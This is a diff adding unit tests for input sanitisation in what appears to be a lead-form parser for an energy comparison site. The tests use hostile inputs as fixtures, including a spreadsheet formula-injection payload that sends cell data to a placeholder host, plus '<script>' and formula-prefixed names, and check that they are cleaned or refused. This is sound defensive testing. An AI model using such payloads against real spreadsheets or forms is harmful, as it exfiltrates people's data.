@@ -165,6 +165,50 @@ describe('parseLeadRequest: valid bodies', () => {
     });
   });
 
+  it('cleans tracking values: at most 512 characters, a narrow charset, no formula start', () => {
+    const tracking = withValue(energy(), 'tracking', {
+      gclid: '  Cj0KCQjw-abc_123  ',
+      utm_campaign: 'zomer actie 2026 – été',
+      utm_source: '=IMPORTDATA("https://x.example/?"&C2)',
+      utm_medium: '@SUM(A1)',
+      utm_content: 'a"b',
+      utm_term: '<script>',
+      wbraid: 'a(b)',
+      referrer: 'https://www.google.com/search?q=energie+vergelijken&hl=nl#top',
+      landing_page: `https://voordeelvinder.be/?utm_source=${'x'.repeat(2000)}`,
+      fbc: 'fb.1.1554763741205.AbCdEfGhIjKlMnOpQrStUvWxYz1234567890',
+      ttclid: 'tab\there',
+    });
+    const cleaned = accepted(tracking).submission.tracking;
+    expect(cleaned).toMatchObject({
+      gclid: 'Cj0KCQjw-abc_123',
+      utm_source: '',
+      utm_medium: '',
+      utm_content: '',
+      utm_term: '',
+      referrer: 'https://www.google.com/search?q=energie+vergelijken&hl=nl#top',
+      fbc: 'fb.1.1554763741205.AbCdEfGhIjKlMnOpQrStUvWxYz1234567890',
+      ttclid: '',
+      wbraid: '',
+    });
+    expect(cleaned.utm_campaign).toBe('zomer actie 2026 – été');
+    expect(cleaned.landing_page).toHaveLength(512);
+    expect(cleaned.landing_page.startsWith('https://voordeelvinder.be/?utm_source=x')).toBe(true);
+    // Still bounded as posted: an absurd value is refused.
+    expect(issuesOf(withValue(energy(), 'tracking', { gclid: 'x'.repeat(2049) }))[0]).toMatch(
+      /^tracking\.gclid: /,
+    );
+  });
+
+  it('refuses a name that starts like a spreadsheet formula', () => {
+    expect(issuesOf(withValue(energy(), 'contact.first_name', '=HYPERLINK("x")'))).toEqual([
+      'contact.first_name: text_invalid',
+    ]);
+    expect(issuesOf(withValue(energy(), 'contact.last_name', '@x'))).toEqual([
+      'contact.last_name: text_invalid',
+    ]);
+  });
+
   it('accepts a preselected visit (no product step answered) and ?test=1', () => {
     const preselected = clientSubmission('zonnepanelen', solarAnswers, { preselected: true });
     const result = accepted({ ...structuredClone(preselected), website: '' });
